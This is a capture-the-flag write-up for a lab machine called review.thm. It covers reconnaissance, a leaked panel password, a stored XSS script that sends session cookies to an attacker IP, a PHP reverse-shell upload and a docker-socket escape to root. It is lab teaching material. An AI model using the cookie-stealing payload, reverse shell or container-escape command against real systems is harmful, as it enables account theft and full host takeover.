# Sequence

Robert made some last-minute updates to the review.thm website before heading off on vacation. He claims that the secret information of the financiers is fully protected. But are his defenses truly airtight? Your challenge is to exploit the vulnerabilities and gain complete control of the system.

`echo "10.49.171.146	review.thm" >> /etc/hosts`

###### Nmap 
`nmap -sCV -T4 -p- review.thm`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4c:d7:d9:82:73:84:15:db:e3:7f:fb:2f:52:6a:3b:af (RSA)
|   256 c3:38:4a:82:1e:90:a4:3c:dc:32:ab:96:a0:87:12:40 (ECDSA)
|_  256 05:66:67:14:44:d3:df:70:db:70:92:f8:a9:11:3a:88 (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Review Shop
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 917.53 seconds
```

###### Bruteforcing Directories with Gobuster
`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://review.thm`

```
/.htaccess            (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 1694]
/javascript           (Status: 301) [Size: 313] [--> http://review.thm/javascript/]
/mail                 (Status: 301) [Size: 307] [--> http://review.thm/mail/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://review.thm/phpmyadmin/]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://review.thm/uploads/]

```

###### Disclosure of Sensitive Information on /mail directory
review.thm/mail/dump.txt
```

From: software@review.thm
To: product@review.thm
Subject: Update on Code and Feature Deployment

Hi Team,

I have successfully updated the code. The Lottery and Finance panels have also been created.

Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.

For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.

I will be away on holiday but will be back soon.

Regards,  
Robert

```

###### Username Enumeration
```
software@review.thm
product@review.thm
robert (?)
robert@review.thm (?)
```

###### Stored XSS 
Sent a message to the moderator using a feedback feature which contained a script to visit an attacker-controlled web server for session cookie theft.
```
<script>
var img = new Image();
img.src = 'http://10.10.47.10:8888/stealcookies?' + document.cookie;
</script>
```

Retrieved flag for moderator account takeover. 

Abused the chat feature to send an admin a message containing a link to the feedback message, containing the XSS exploit. 

Retrieved the flag for admin account takeover. 

###### Unintended Exposure of Resources
Edited the value of lottery.php in the dropdown feature to visit finance.php and accessed the panel with the previously retrieved password: `S60u}f5j`
There is a file upload feature on the finance panel. We can get RCE by uploading the reverse shell script using 0day's reverse shell php file. 

Edited the dropdown value to "uploads/reverse_shell.php" and executed the submit request. Got a reverse shell. 


###### Docker Escape 

Because root access has already been obtained, docker escape can be achieved because the socket is mounted to the host 
`ls -la /var/run/docker.sock`

This command can be used to escape out of the container:
`docker run -v /:/host --privileged -it phpvulnerable chroot /host`

Root flag retrieved. 